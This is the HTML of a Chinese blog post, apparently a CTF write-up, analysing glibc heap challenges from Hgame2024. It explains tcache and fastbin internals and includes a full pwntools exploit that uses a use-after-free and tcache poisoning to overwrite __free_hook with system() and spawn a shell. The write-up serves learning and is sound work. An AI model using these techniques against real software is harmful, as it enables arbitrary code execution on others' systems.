@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="M1aoo0bin">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/06/21/heap初探/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="基本没啥好看的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="heap初探 | Hgame2024 week2&amp;week3 堆部分分析">
+<meta property="og:url" content="http://example.com/2024/06/21/heap%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="Z1naX5">
+<meta property="og:description" content="基本没啥好看的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/06/21/heap%E5%88%9D%E6%8E%A2/img.png">
+<meta property="article:published_time" content="2024-06-21T13:35:53.000Z">
+<meta property="article:modified_time" content="2024-06-22T19:57:50.891Z">
+<meta property="article:author" content="Z1naX5">
+<meta property="article:tag" content="学习日志">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/21/heap%E5%88%9D%E6%8E%A2/img.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/pic/hello.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/pic/hello.png">
+    <meta name="theme-color" content="#3850AB">
+    <link rel="shortcut icon" href="/pic/hello.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            heap初探 | Hgame2024 week2&amp;week3 堆部分分析 -
+        
+        Zena Xu
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3850AB","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/pic/light_background.jpg","dark":"/pic/dark_background.png"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#363636","dark":"#d2dde8"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":25},"width":{"home":"1200px","pages":"1200px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Zena Xu
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/pic/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Zena Xu
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://picture.gptkong.com/20240622/002430ca31ab8d41d394fc73a2de258bc6.png" alt="heap初探 | Hgame2024 week2&amp;week3 堆部分分析" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">heap初探 | Hgame2024 week2&amp;week3 堆部分分析</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/pic/photo.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">M1aoo0bin</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-06-21 21:35:53</span>
+        <span class="mobile">2024-06-21 21:35:53</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-06-23 03:57:50</span>
+            <span class="mobile">2024-06-23 03:57:50</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/">学习日志</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>(っ●ω●)っ</p>
+<h3 id="对堆的简单认识"><a href="#对堆的简单认识" class="headerlink" title="对堆的简单认识"></a>对堆的简单认识</h3><p>堆管理器：ptmalloc2 - glibc<br>内存分配区：arena，收发内存的地方<br>内存的单位：chunk </p>
+<p><em>malloc一个chunk的结构</em></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T mchunk_prev_size; //size of previous chunk (if free)</span><br><span class="line"></span><br><span class="line">INTERNAL_SIIZE_T mchunk_size; //size in bytes,including overhead</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* fd; //double links -- used only if free</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* bk; /* only used for large blocks:pointer to next larger size; */</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* fd_nextsize; //double links -- used only if free</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* bk_nextsize;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>由于64位chunk内存对齐0x10,32位内存对齐0x08<br>所以size位低三位始终为0,记录：<br><code>NON_ MIAN_ ARENA</code>,当前chunk是否不属于主线程，1表示不属于，0表示属于。<br><code>IS_MAPPED</code>，当前chunk是否是由mmap分配的。<br><code>PREV_INUSE</code>，前一个chunk块是否被分配，1表示分配，0表示未分配。</p>
+<p>释放后的chunk:bin<br><code>unsorted bin</code>:</p>
+<ul>
+<li>垃圾桶中的垃圾桶</li>
+<li>双向链表</li>
+</ul>
+<p><code>fast bins</code>:</p>
+<ul>
+<li>0x20-0x80</li>
+<li>后进先出 LIFO;单向链表(fd)</li>
+</ul>
+<p><code>small bins</code>:</p>
+<ul>
+<li>0x20-0x400</li>
+</ul>
+<p><code>large bins</code>:</p>
+<ul>
+<li>0x400-</li>
+<li>双向链表</li>
+</ul>
+<p><code>(tcache)glibc-2.27</code>:</p>
+<ul>
+<li>0x20-0x400</li>
+<li>进入tcache bin的chunk的fd指的是下一个chunk的头指针，而其他的bin会指向chunk_addr,即prev_size的地方</li>
+<li>tcache bin里的chunk不会发生合并（不取消inuse bit）</li>
+<li>后进先出 LIFO;单向链表(fd)</li>
+</ul>
+<p>对于具体的chunk的申请释放我主要参考了，不再赘叙：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cjovi.icu/pwnreview/1300.html" >chuj学长的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/overview/" >ctf-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="week2堆题分析"><a href="#week2堆题分析" class="headerlink" title="week2堆题分析"></a>week2堆题分析</h3><p>给的漏洞都是比较明显好利用的，静态分析的部分基本上都略过了。</p>
+<h4 id="Elden-Ring-II"><a href="#Elden-Ring-II" class="headerlink" title="Elden Ring II"></a>Elden Ring II</h4><p>UAF，没有对使用过的指针置0。</p>
+<h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h5><p>tcache_put:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>tcache_get:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="line">   available chunks to remove.  */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到tcache在放入和取出的时候都几乎没有校验，只要有空位置就可以放，存在可以取的chunk就可以取。</p>
+<p>所以<code>tcache_poisoning</code>发生在<code>tcache_get</code>时不作任何校验把一块别的地方当作重新利用的chunk,实现任意地址写。<br>实现<code>tcache_poisoning</code>则是需要把bin中的一个fd指向希望伪造的其他地方。在这个题里是UAF  </p>
+<blockquote>
+<p>调试时还可以看到改完fd后tcache bin里的count还是旧的，但依然没有问题。充分说明了放入和取出的优先级高于了很多检查。</p>
+</blockquote>
+<p>下面是我的exp</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;1&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(b&quot;Size: &quot;,str(size).encode())</span><br><span class="line">    </span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(b&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;4&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    </span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i,0x90)</span><br><span class="line">add(8,0x20) #防止合并</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(7) #libc泄露</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(6).ljust(0x08,b&quot;\x00&quot;))-0x1ecbe0</span><br><span class="line">success(&quot;libc_base = &quot; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line">success(&quot;libc_base = &quot; + hex(free_hook))</span><br><span class="line"></span><br><span class="line">#-------</span><br><span class="line">add(9,0x60)</span><br><span class="line">add(10,0x60)</span><br><span class="line">add(11,0x20) #防止合并</span><br><span class="line"></span><br><span class="line">delete(9)</span><br><span class="line">delete(10)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">edit(10,p64(free_hook)) #tcache posioning</span><br><span class="line"></span><br><span class="line">add(12,0x60)</span><br><span class="line">add(13,0x60)</span><br><span class="line">edit(13,p64(system_addr)) #任意地址写入system()</span><br><span class="line"></span><br><span class="line">add(14,0x20) #准备触发</span><br><span class="line">edit(14,b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">delete(14)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>对了这个题不允许使用用过的index,哪怕free过，所以要数一下谁是谁。</p>
+<h4 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h4><p>UAF,but null</p>
+<h5 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h5><p>free后指针清零，不代表我们不能控制这个指针了。fastbin double free就是混淆对这个指针的控制，导致一边在正常获取堆块写数据的操作在fastbin里也有响应，伪造一个chunk。依旧是实现任意地址写。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* Another simple check: make sure the top of the bin is not the</span><br><span class="line">       record we are going to add (i.e., double free).  */</span><br><span class="line">    if (__builtin_expect (old == p, 0))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = &quot;double free or corruption (fasttop)&quot;;</span><br><span class="line">        goto errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>fastbin的源码里考虑了double free，但是只检查链表的后一个，且fastbin的堆块被释放后next_chunk的pre_inuse位不会被清0。(好奇怪的机制。不清0,可能是为了快吧。)<br>所以只要在free的中间加一个无关的chunk,就能做到fastbin double free。</p>
+<p>和上一题太像了，exp也没啥好贴的。</p>
+<h4 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h4><p>UAF,but null &amp;&amp; libc-2.23  </p>
